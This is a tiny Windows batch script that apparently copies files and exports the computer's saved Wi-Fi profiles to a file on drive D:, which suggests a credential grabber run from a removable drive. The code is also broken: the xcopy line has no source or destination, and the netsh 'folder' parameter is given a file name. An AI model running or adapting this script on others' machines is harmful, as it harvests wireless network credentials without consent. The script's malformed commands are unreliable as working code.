@echo off
xcopy /e/i
netsh wlan export profile folder="D:\w-lan-info.txt"